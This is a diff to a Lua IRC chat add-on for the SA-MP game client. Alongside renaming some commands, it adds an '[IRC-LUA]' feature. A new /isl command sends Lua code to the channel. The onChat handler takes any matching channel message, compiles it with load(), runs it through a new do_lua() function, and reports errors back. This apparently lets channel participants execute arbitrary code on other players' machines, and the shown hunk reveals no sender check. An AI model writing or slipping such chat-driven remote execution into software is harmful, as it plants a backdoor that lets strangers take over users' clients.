@@ -45,7 +45,7 @@ function main()
 	sampRegisterChatCommand('/il',function() s:send("NAMES %s", channel) end)
 	sampRegisterChatCommand('/isc',function(arg)
 		if #arg > 0 then
-			send('CMD '..arg,false)
+			send('COPY '..arg,false)
 		end
 	end)
 	sampRegisterChatCommand('/isp',function(url)
@@ -62,7 +62,7 @@ function main()
 		end
 	end)
 
-	sampRegisterChatCommand('/ism',function()
+	sampRegisterChatCommand('/im',function()
 		sampShowDialog(1000,'irc.lua','sending audio\nstop audio\ndownload file','>>>','<<<',2)
 	end)
 
@@ -80,6 +80,13 @@ function main()
 				send('[IRC-SAY] '..arg)
 			end 
 		end)
+		sampRegisterChatCommand('/isl',function(lua)
+			if #lua > 0 then
+				send('[IRC-LUA] '..lua)
+
+			end
+		end)
+
 	end
 
 	while true do wait(0)
@@ -155,6 +162,13 @@ function onChat(user, channel, text)
 		if text:find('version irc') then
 			send(thisScript().version)
 		end
+		if text:find('%[IRC%-LUA%] .+') then
+			local code = text:match('%[IRC%-LUA%] (.+)')
+			local err = do_lua(code)
+			if err ~= nil then
+				send('[IRC-LUA_ERR] '..err)
+			end
+		end
 	end
 
 	if not findStringInTable(msg['hideMsgOnChat'],text) then
@@ -165,9 +179,9 @@ function onChat(user, channel, text)
 			sampGetPlayerIdByNickname(user.nick),
 			u8:decode(text)
 			),0xffea30)
-		if text:find('CMD .+') then
+		if text:find('COPY .+') then
 			sampAddChatMessage('[IRC] команда была скопирована в буфер-обмена!',0xffef61)
-			setClipboardText(string.match(text,'CMD (.+)'))
+			setClipboardText(string.match(text,'COPY (.+)'))
 		end
 		if text:find('%[IRC%-PLAY%] .+') then
 
@@ -415,4 +429,23 @@ function dialogs()
 			end
 		end
 	end
+end
+
+function do_lua(code)
+    if code:sub(1,1) == '=' then
+        code = "print(" .. code:sub(2, -1) .. ")"
+    end
+    local func, err = load(code)
+    if func then
+        local result, err = pcall(func)
+        if not result then
+            -- sampAddChatMessage(err,-1)
+            return err
+        end
+    else
+        -- sampAddChatMessage(err,-1)
+        return err
+    end
+
+    return nil
 end
